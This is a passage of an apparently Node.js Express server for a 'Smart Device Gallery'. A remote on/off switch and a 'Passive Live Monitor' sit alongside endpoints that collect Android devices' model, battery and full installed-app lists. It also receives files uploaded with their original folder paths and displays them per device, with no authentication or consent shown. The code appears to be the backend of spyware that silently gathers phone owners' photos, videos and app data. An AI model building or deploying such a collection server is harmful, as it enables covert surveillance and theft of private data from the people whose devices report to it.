          gap: 12px;
          padding: 0 14px 14px;
        }

        .file-actions a,
        .table-actions a {
          color: var(--accent);
          text-decoration: none;
        }

        .file-actions button,
        .table-actions button {
          padding: 0;
          border: none;
          background: transparent;
          color: #ff8d8d;
          cursor: pointer;
          font: inherit;
        }

        .file-table-wrap {
          display: none;
          margin-top: 14px;
          overflow-x: auto;
        }

        .list-view .file-grid {
          display: none;
        }

        .list-view .file-table-wrap {
          display: block;
        }

        .file-table {
          width: 100%;
          border-collapse: collapse;
        }

        .file-table th,
        .file-table td {
          padding: 12px 10px;
          border-bottom: 1px solid var(--line);
          text-align: left;
        }

        .preview-card {
          background: rgba(255, 255, 255, 0.03);
          border: 1px solid var(--line);
          border-radius: 24px;
          overflow: hidden;
        }

        .preview-media {
          aspect-ratio: 4 / 3;
          background: rgba(255, 255, 255, 0.03);
          display: flex;
          align-items: center;
          justify-content: center;
          overflow: hidden;
        }

        .preview-media img,
        .preview-media video {
          width: 100%;
          height: 100%;
          object-fit: cover;
        }

        .preview-info {
          padding: 18px;
          display: grid;
          gap: 10px;
        }

        .preview-meta {
          display: grid;
          gap: 8px;
        }

        .preview-actions {
          display: flex;
          gap: 12px;
          margin-top: 8px;
        }

        .preview-actions a {
          flex: 1;
          text-align: center;
          text-decoration: none;
          padding: 12px;
          border-radius: 12px;
          color: var(--text);
          background: rgba(255, 255, 255, 0.05);
          border: 1px solid var(--line);
        }

        .preview-actions a.primary {
          background: linear-gradient(135deg, rgba(109, 255, 177, 0.12), rgba(51, 209, 122, 0.14));
          border-color: rgba(109, 255, 177, 0.35);
        }

        .empty-state {
          padding: 32px;
          border-radius: 18px;
          border: 1px dashed var(--line);
          text-align: center;
          color: var(--muted);
          background: rgba(255, 255, 255, 0.03);
        }

        .hidden-by-search,
        .hidden-by-filter,
        .hidden-by-batch {
          display: none !important;
        }

        @media (max-width: 1200px) {
          .app-shell {
            grid-template-columns: 240px minmax(0, 1fr);
          }

          .preview {
            display: none;
          }
        }

        @media (max-width: 820px) {
          .app-shell {
            grid-template-columns: 1fr;
          }

          .sidebar {
            position: static;
            height: auto;
            border-right: none;
            border-bottom: 1px solid var(--line);
          }

          .stats-bar {
            grid-template-columns: repeat(2, minmax(0, 1fr));
          }

          .panel-top {
            flex-direction: column;
          }
        }
      </style>
    </head>
    <body>
      <div class="app-shell">
        <aside class="sidebar">
          <div class="brand">
            <p class="eyebrow">Operational Gallery</p>
            <h1>Smart Device Gallery</h1>
            <p>${devices.length} devices connected</p>
          </div>
          <div class="device-nav">
            ${sidebarDevices || '<div class="empty-state">No devices available</div>'}
          </div>
        </aside>

        <main class="main" id="galleryRoot">
          <div class="top-strip">
            <div class="live-pill">
              <span class="live-dot"></span>
              <span>Passive Live Monitor</span>
            </div>
            <div class="sync-banner" id="syncBanner">
              <span>New uploads available</span>
              <button type="button" id="refreshNowBtn">Refresh Now</button>
            </div>
          </div>

          <section class="stats-bar">
            <div class="stat-card"><strong id="totalDevicesCount">${devices.length}</strong><span>Devices</span></div>
            <div class="stat-card"><strong id="totalFoldersCount">${totalFolders}</strong><span>Folders</span></div>
            <div class="stat-card"><strong id="totalImagesCount">${totalImages}</strong><span>Images</span></div>
            <div class="stat-card"><strong id="totalVideosCount">${totalVideos}</strong><span>Videos</span></div>
          </section>

          <section class="toolbar">
            <input id="searchInput" type="search" placeholder="Search by file, folder, device...">
            <div class="type-toggle">
              <button class="active" data-filter="all">All</button>
              <button data-filter="image">Images</button>
              <button data-filter="video">Videos</button>
            </div>
            <div class="view-toggle">
              <button class="active" data-view="grid">Grid</button>
              <button data-view="list">List</button>
            </div>
          </section>

          ${panels || '<div class="empty-state">No files received yet.</div>'}
        </main>

        <aside class="preview">
          <p class="eyebrow">Preview Pane</p>
          <div class="preview-card">
            <div class="preview-media" id="previewMedia">
              <div class="file-icon">FILE</div>
            </div>
            <div class="preview-info">
              <div>
                <h3 id="previewName">Select a file</h3>
                <small id="previewType">Choose any card to inspect details</small>
              </div>
              <div class="preview-meta">
                <span id="previewDevice">Device: -</span>
                <span id="previewFolder">Folder: -</span>
                <span id="previewTime">Updated: -</span>
                <span id="previewSize">Size: -</span>
              </div>
              <div class="preview-actions">
                <a id="previewOpen" href="#" target="_blank" rel="noreferrer" class="primary">Open</a>
                <a id="previewDownload" href="#" download>Download</a>
              </div>
            </div>
          </div>
        </aside>
      </div>

      <div class="modal" id="deleteModal" aria-hidden="true">
        <div class="modal-card">
          <div class="modal-head">
            <h3>Delete File</h3>
            <small class="eyebrow">This action removes the file, thumbnail, and log entry.</small>
          </div>
          <div class="modal-body">
            <div>Confirm delete for the selected file.</div>
            <div class="modal-file" id="deleteModalFile">-</div>
          </div>
          <div class="modal-actions">
            <button type="button" class="modal-cancel" id="deleteCancelBtn">Cancel</button>
            <button type="button" class="modal-delete" id="deleteConfirmBtn">Delete</button>
          </div>
        </div>
      </div>

      <script>
        const GALLERY_SIGNATURE = ${JSON.stringify(gallerySignature)};
        const root = document.getElementById("galleryRoot");
        const searchInput = document.getElementById("searchInput");
        const navButtons = document.querySelectorAll(".nav-device");
        const panels = document.querySelectorAll(".device-panel");
        const viewButtons = document.querySelectorAll(".view-toggle button");
        const typeButtons = document.querySelectorAll(".type-toggle button");
        const previewButtons = document.querySelectorAll(".file-preview-trigger");
        const deleteButtons = document.querySelectorAll(".delete-file-btn");
        const folderSections = document.querySelectorAll(".folder-section");

        const previewMedia = document.getElementById("previewMedia");
        const previewName = document.getElementById("previewName");
        const previewType = document.getElementById("previewType");
        const previewDevice = document.getElementById("previewDevice");
        const previewFolder = document.getElementById("previewFolder");
        const previewTime = document.getElementById("previewTime");
        const previewSize = document.getElementById("previewSize");
        const previewOpen = document.getElementById("previewOpen");
        const previewDownload = document.getElementById("previewDownload");
        const totalDevicesCount = document.getElementById("totalDevicesCount");
        const totalFoldersCount = document.getElementById("totalFoldersCount");
        const totalImagesCount = document.getElementById("totalImagesCount");
        const totalVideosCount = document.getElementById("totalVideosCount");

        const syncBanner = document.getElementById("syncBanner");
        const refreshNowBtn = document.getElementById("refreshNowBtn");
        const deleteModal = document.getElementById("deleteModal");
        const deleteModalFile = document.getElementById("deleteModalFile");
        const deleteCancelBtn = document.getElementById("deleteCancelBtn");
        const deleteConfirmBtn = document.getElementById("deleteConfirmBtn");

        const state = {
          filter: sessionStorage.getItem("gallery-filter") || "all",
          query: sessionStorage.getItem("gallery-query") || "",
          activeDevice: sessionStorage.getItem("gallery-device") || "",
          batchSize: 12,
          pendingDelete: null
        };

        function activateDevice(deviceId) {
          state.activeDevice = deviceId;
          sessionStorage.setItem("gallery-device", deviceId);
          document.querySelectorAll(".nav-device").forEach((button) => {
            button.classList.toggle("active", button.dataset.device === deviceId);
          });

          document.querySelectorAll(".device-panel").forEach((panel) => {
            panel.classList.toggle("active", panel.dataset.devicePanel === deviceId);
          });

          applyFilters();
        }

        function setPreview(button) {
          const type = button.dataset.type;
          const url = button.dataset.url;
          const thumb = button.dataset.thumb;

          previewName.textContent = button.dataset.name;
          previewType.textContent = type.toUpperCase();
          previewDevice.textContent = "Device: " + button.dataset.device;
          previewFolder.textContent = "Folder: " + button.dataset.folder;
          previewTime.textContent = "Updated: " + button.dataset.time;
          previewSize.textContent = "Size: " + button.dataset.size;
          previewOpen.href = url;
          previewDownload.href = url;

          if (type === "image") {
            previewMedia.innerHTML = '<img src="' + thumb + '" alt="">';
          } else if (type === "video") {
            previewMedia.innerHTML = '<video controls preload="metadata"><source src="' + url + '"></video>';
          } else {
            previewMedia.innerHTML = '<div class="file-icon">' + type.slice(0, 4).toUpperCase() + "</div>";
          }
        }

        function resetPreview() {
          previewName.textContent = "Select a file";
          previewType.textContent = "Choose any card to inspect details";
          previewDevice.textContent = "Device: -";
          previewFolder.textContent = "Folder: -";
          previewTime.textContent = "Updated: -";
          previewSize.textContent = "Size: -";
          previewOpen.href = "#";
          previewDownload.href = "#";
          previewMedia.innerHTML = '<div class="file-icon">FILE</div>';
        }

        function resetBatches() {
          document.querySelectorAll(".folder-section").forEach((section) => {
            section.dataset.limit = String(state.batchSize);
          });
        }

        function applyFilters() {
          const query = state.query.toLowerCase();
          document.querySelectorAll(".device-panel").forEach((panel) => {
            const isActivePanel = panel.classList.contains("active");
            if (!isActivePanel) return;

            panel.querySelectorAll(".folder-section").forEach((section) => {
              const cards = Array.from(section.querySelectorAll(".file-card"));
              const rows = Array.from(section.querySelectorAll(".file-row"));
              const visibleCards = [];
              const visibleRows = [];

              cards.forEach((item) => {
                const haystack = (item.dataset.search || "").toLowerCase();
                const type = item.dataset.type || "file";
                const searchHidden = query && !haystack.includes(query);
                const typeHidden = state.filter !== "all" && type !== state.filter;
                item.classList.toggle("hidden-by-search", !!searchHidden);
                item.classList.toggle("hidden-by-filter", !!typeHidden);
                if (!searchHidden && !typeHidden) visibleCards.push(item);
              });

              rows.forEach((item) => {
                const haystack = (item.dataset.search || "").toLowerCase();
                const type = item.dataset.type || "file";
                const searchHidden = query && !haystack.includes(query);
                const typeHidden = state.filter !== "all" && type !== state.filter;
                item.classList.toggle("hidden-by-search", !!searchHidden);
                item.classList.toggle("hidden-by-filter", !!typeHidden);
                if (!searchHidden && !typeHidden) visibleRows.push(item);
              });

              const limit = Number(section.dataset.limit || state.batchSize);
              visibleCards.forEach((item, index) => {
                item.classList.toggle("hidden-by-batch", index >= limit);
              });
              visibleRows.forEach((item, index) => {
                item.classList.toggle("hidden-by-batch", index >= limit);
              });

              section.classList.toggle("hidden-by-filter", visibleCards.length === 0 && visibleRows.length === 0);

              const loadMoreBtn = section.querySelector(".load-more-btn");
              const maxCount = Math.max(visibleCards.length, visibleRows.length);
              if (loadMoreBtn) {
                loadMoreBtn.style.display = maxCount > limit ? "inline-flex" : "none";
              }
            });
          });
        }

        function refreshCounts() {
          const activePanels = Array.from(document.querySelectorAll(".device-panel"));
          const activeDevicePanels = activePanels.filter((panel) => panel.querySelector(".file-card, .file-row"));

          if (totalDevicesCount) {
            totalDevicesCount.textContent = String(activeDevicePanels.length);
          }

          if (totalFoldersCount) {
            totalFoldersCount.textContent = String(document.querySelectorAll(".folder-section").length);
          }

          if (totalImagesCount) {
            totalImagesCount.textContent = String(document.querySelectorAll('.file-card[data-type="image"]').length);
          }

          if (totalVideosCount) {
            totalVideosCount.textContent = String(document.querySelectorAll('.file-card[data-type="video"]').length);
          }

          document.querySelectorAll(".device-panel").forEach((panel) => {
            const fileCount = panel.querySelectorAll(".file-card").length;
            const folderCount = panel.querySelectorAll(".folder-section").length;
            const fileCountNode = panel.querySelector(".device-file-count");
            const folderCountNode = panel.querySelector(".device-folder-count");
            if (fileCountNode) fileCountNode.textContent = String(fileCount);
            if (folderCountNode) folderCountNode.textContent = String(folderCount);
          });

          document.querySelectorAll(".nav-device").forEach((button) => {
            const deviceId = button.dataset.device;
            const panel = document.querySelector('[data-device-panel="' + CSS.escape(deviceId) + '"]');
            const count = panel ? panel.querySelectorAll(".file-card").length : 0;
            const meta = button.querySelector("small");
            if (meta) {
              const ip = meta.textContent.split(" • ")[0];
              meta.textContent = ip + " • " + count + " files";
            }
            if (panel && count === 0) {
              button.remove();
              panel.remove();
            }
          });

          const currentActivePanel = document.querySelector(".device-panel.active");
          if (!currentActivePanel) {
            const firstButton = document.querySelector(".nav-device");
            if (firstButton) {
              activateDevice(firstButton.dataset.device);
            }
          }
        }

        function removeFileFromUI(fileName) {
          const relatedCards = Array.from(document.querySelectorAll('.file-card[data-file="' + CSS.escape(fileName) + '"]'));
          const relatedRows = Array.from(document.querySelectorAll('.file-row[data-file="' + CSS.escape(fileName) + '"]'));

          const previewWasDeleted =
            previewOpen.href && previewOpen.href.includes("/uploads/" + encodeURIComponent(fileName));

          relatedCards.forEach((card) => {
            const section = card.closest(".folder-section");
            card.remove();
            if (section && section.querySelectorAll(".file-card").length === 0) {
              section.remove();
            }
          });

          relatedRows.forEach((row) => row.remove());

          if (previewWasDeleted) {
            const fallbackPreview = document.querySelector(".file-preview-trigger");
            if (fallbackPreview) setPreview(fallbackPreview);
            else resetPreview();
          }

          refreshCounts();
          applyFilters();
        }

        document.querySelectorAll(".nav-device").forEach((button) => {
          button.addEventListener("click", () => activateDevice(button.dataset.device));
        });

        document.querySelectorAll(".view-toggle button").forEach((button) => {
          button.addEventListener("click", () => {
            document.querySelectorAll(".view-toggle button").forEach((item) => item.classList.toggle("active", item === button));
            root.classList.toggle("list-view", button.dataset.view === "list");
            applyFilters();
          });
        });

        document.querySelectorAll(".type-toggle button").forEach((button) => {
          button.classList.toggle("active", button.dataset.filter === state.filter);
          button.addEventListener("click", () => {
            state.filter = button.dataset.filter;
            sessionStorage.setItem("gallery-filter", state.filter);
            document.querySelectorAll(".type-toggle button").forEach((item) => item.classList.toggle("active", item === button));
            resetBatches();
            applyFilters();
          });
        });

        searchInput.value = state.query;
        searchInput.addEventListener("input", () => {
          state.query = searchInput.value.trim();
          sessionStorage.setItem("gallery-query", state.query);
          resetBatches();
          applyFilters();
        });

        document.querySelectorAll(".folder-section").forEach((section) => {
          section.dataset.limit = String(state.batchSize);
          const loadMoreBtn = section.querySelector(".load-more-btn");
          if (loadMoreBtn) {
            loadMoreBtn.addEventListener("click", () => {
              section.dataset.limit = String(Number(section.dataset.limit || state.batchSize) + state.batchSize);
              applyFilters();
            });
          }
        });

        if ("IntersectionObserver" in window) {
          const observer = new IntersectionObserver((entries) => {
            entries.forEach((entry) => {
              if (!entry.isIntersecting) return;
              const button = entry.target.querySelector(".load-more-btn");
              if (!button || button.style.display === "none") return;
              entry.target.dataset.limit = String(Number(entry.target.dataset.limit || state.batchSize) + 6);
              applyFilters();
            });
          }, { rootMargin: "220px 0px" });

          document.querySelectorAll(".folder-section").forEach((section) => observer.observe(section));
        }

        document.querySelectorAll(".file-preview-trigger").forEach((button) => {
          button.addEventListener("click", () => setPreview(button));
        });

        function openDeleteModal(payload) {
          state.pendingDelete = payload;
          deleteModalFile.textContent = payload.name || payload.file;
          deleteModal.classList.add("show");
          deleteModal.setAttribute("aria-hidden", "false");
        }

        function closeDeleteModal() {
          state.pendingDelete = null;
          deleteModal.classList.remove("show");
          deleteModal.setAttribute("aria-hidden", "true");
        }

        document.querySelectorAll(".delete-file-btn").forEach((button) => {
          button.addEventListener("click", () => {
            openDeleteModal({
              file: button.dataset.file,
              thumb: button.dataset.thumb,
              name: button.dataset.name || button.dataset.file
            });
          });
        });

        deleteCancelBtn.addEventListener("click", closeDeleteModal);
        deleteModal.addEventListener("click", (event) => {
          if (event.target === deleteModal) closeDeleteModal();
        });

        document.addEventListener("keydown", (event) => {
          if (event.key === "Escape" && deleteModal.classList.contains("show")) {
            closeDeleteModal();
          }
        });

        deleteConfirmBtn.addEventListener("click", async () => {
          if (!state.pendingDelete) return;

          try {
            const response = await fetch("/delete-file", {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                file: state.pendingDelete.file,
                thumb: state.pendingDelete.thumb
              })
            });

            if (!response.ok) {
              window.alert("Delete failed");
              return;
            }

            const deletedFile = state.pendingDelete.file;
            closeDeleteModal();
            removeFileFromUI(deletedFile);
          } catch {
            window.alert("Delete failed");
          }
        });

        function pollForUpdates() {
          window.setInterval(async () => {
            try {
              const response = await fetch("/gallery/live-status", {
                headers: { "Accept": "application/json" },
                cache: "no-store"
              });
              if (!response.ok) return;
              const data = await response.json();
              if (data.signature && data.signature !== GALLERY_SIGNATURE) {
                syncBanner.classList.add("show");
              }
            } catch {}
          }, 5000);
        }

        refreshNowBtn.addEventListener("click", () => {
          window.location.reload();
        });

        const defaultDevice =
          state.activeDevice &&
          document.querySelector('[data-device="' + CSS.escape(state.activeDevice) + '"]')
            ? state.activeDevice
            : (document.querySelector(".nav-device") && document.querySelector(".nav-device").dataset.device);

        if (defaultDevice) activateDevice(defaultDevice);
        const firstPreview = document.querySelector(".file-preview-trigger");
        if (firstPreview) setPreview(firstPreview);
        applyFilters();
        pollForUpdates();
      </script>
    </body>
  </html>
  `;
}

/* ================= CONFIG ================= */

app.get("/config", (req, res) => {
  const cfg = loadConfig();
  res.send(cfg.enabled ? "1" : "0");
});

/* ================= TRACK ================= */

app.post("/track", (req, res) => {
  if (!isAllowed(req, "track")) {
    return res.json({ status: "blocked" });
  }

  let body = "";

  req.on("data", (chunk) => {
    body += chunk.toString();
  });

  req.on("end", () => {
    const parsed = parseBody(body);

    const allApps = parsed.apps
      ? parsed.apps.split(",").map((appName) => appName.trim()).filter(Boolean)
      : [];

    const systemApps = allApps.filter(
      (appName) =>
        appName.startsWith("android") ||
        appName.startsWith("com.android") ||
        appName.startsWith("com.google")
    );

    const userApps = allApps.filter((appName) => !systemApps.includes(appName));
    const ip = getIP(req);
    const deviceId = createDeviceId(ip, parsed.brand, parsed.model);

    const data = {
      type: "device",
      ip,
      device_id: deviceId,
      battery: parsed.battery,
      model: parsed.model,
      brand: parsed.brand,
      android: parsed.android,
      app_count: allApps.length,
      system_apps: systemApps,
      user_apps: userApps,
      time: new Date().toISOString(),
    };

    console.log(
      `[DEVICE] ${data.ip} | ${data.brand || "-"} ${data.model || "-"} | Android ${data.android || "-"} | Battery ${data.battery || "-"}% | Apps ${data.app_count}`
    );

    saveLog(data);
    res.json({ status: "ok", device_id: deviceId });
  });
});

/* ================= UPLOAD ================= */

app.post("/upload", (req, res) => {
  if (!isAllowed(req, "upload")) {
    return res.status(403).send("blocked");
  }

  let fileName = "file.bin";
  let folder = "unknown";

  if (req.query.name) {
    try {
      const decoded = decodeURIComponent(req.query.name);
      folder = path.dirname(decoded);
      fileName = path.basename(decoded);
    } catch {}
  }

  const ip = getIP(req);
  const logs = readLogs();
  const latestDevice = getLatestDeviceForIP(ip, logs);
  const deviceBrand = req.query.brand || latestDevice?.brand || "";
  const deviceModel = req.query.model || latestDevice?.model || "";
  const deviceId =
    req.query.device_id || createDeviceId(ip, deviceBrand, deviceModel);

  const safeName = `${Date.now()}_${fileName}`;
  const filePath = path.join(UPLOAD_DIR, safeName);

  const thumbName = `thumb_${safeName}`;
  const thumbPath = path.join(THUMB_DIR, thumbName);

  console.log(
    `[FILE] ${ip} | ${deviceBrand || "-"} ${deviceModel || "-"} | ${folder}/${fileName}`
  );

  const stream = fs.createWriteStream(filePath);
  req.pipe(stream);

  stream.on("finish", () => {
    let size = 0;
    try {
      size = fs.statSync(filePath).size;
    } catch {}

    fs.copyFile(filePath, thumbPath, () => {});

    saveLog({
      type: "file",
      file: safeName,
      original: fileName,
      folder,
      thumb: thumbName,
      ip,
      device_id: deviceId,
      device_brand: deviceBrand,
      device_model: deviceModel,
      size,
      time: new Date().toISOString(),
    });

    res.json({ status: "uploaded", file: safeName, device_id: deviceId });
  });

  stream.on("error", () => {
    res.status(500).send("error");
  });

  req.on("error", () => {
    res.status(500).send("error");
  });
});

/* ================= USERS ================= */

app.get("/users", (req, res) => {
  const logs = readLogs();
  if (!logs.length) return res.send("No data");
  res.send(renderUsersPage(logs));
});

/* ================= GALLERY ================= */

app.get("/gallery", (req, res) => {
  const logs = readLogs();
  if (!logs.length) return res.send("No data");

  const devices = buildGalleryData(logs).filter((device) => device.files.length);
  res.send(renderGalleryPage(devices));
});

app.get("/gallery/live-status", (req, res) => {
  const logs = readLogs();
  const devices = buildGalleryData(logs).filter((device) => device.files.length);
  res.json({
    signature: getGallerySignature(devices),
    devices: devices.length,
    files: devices.reduce((sum, device) => sum + device.files.length, 0),
  });
});

app.post("/delete-file", (req, res) => {
  const fileName = path.basename(req.body?.file || "");
  const thumbName = path.basename(req.body?.thumb || "");

  if (!fileName) {
    return res.status(400).json({ status: "error", message: "Missing file name" });
  }

  const filePath = path.join(UPLOAD_DIR, fileName);
  const thumbPath = thumbName ? path.join(THUMB_DIR, thumbName) : "";

  try {
    if (fs.existsSync(filePath)) {
      fs.unlinkSync(filePath);
    }

    if (thumbPath && fs.existsSync(thumbPath)) {
      fs.unlinkSync(thumbPath);
    }

    removeFileLogEntries(fileName);
    console.log(`[DELETE] ${fileName}${thumbName ? ` | thumb ${thumbName}` : ""}`);
    return res.json({ status: "deleted", file: fileName });
  } catch {
    return res.status(500).json({ status: "error", message: "Delete failed" });
  }
});

/* ================= STATIC ================= */

app.use("/uploads", express.static(UPLOAD_DIR));
app.use("/thumbs", express.static(THUMB_DIR));

/* ================= START ================= */

const PORT = process.env.PORT || 3000;

app.listen(PORT, () => {
  console.log("Server running on port", PORT);
});
